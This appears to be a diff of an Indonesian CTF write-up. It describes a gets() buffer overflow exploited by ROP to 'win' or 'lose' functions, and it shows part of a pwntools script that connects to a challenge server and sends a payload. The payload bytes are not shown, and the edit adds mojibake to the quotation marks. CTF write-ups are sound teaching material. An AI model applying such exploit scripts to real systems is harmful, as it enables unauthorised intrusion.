@@ -1,6 +1,6 @@
 # troll
 
-fungsi gets() terdapat vulnerability bufferoverflow. dapat dilakukan ROP ke fungsi win atau lose. pada fungsi lose, dialkukan print(“redacted”). kemungkinan flag berada disini
+fungsi gets() terdapat vulnerability bufferoverflow. dapat dilakukan ROP ke fungsi win atau lose. pada fungsi lose, dialkukan print(â€œredactedâ€). kemungkinan flag berada disini
 <br>
 
 ```
@@ -38,6 +38,14 @@ payload=
 
 r=remote('34.87.0.60',2058)
 
-#gdb.attach(r) print r.recv() r.sendline('a') print r.recv() r.sendline('a') print r.recv() r.sendline(payload) print r.recv() r.interactive()
+#gdb.attach(r) 
+print r.recv() 
+r.sendline('a') 
+print r.recv() 
+r.sendline('a') 
+print r.recv() 
+r.sendline(payload) 
+print r.recv() 
+r.interactive()
 
 ```
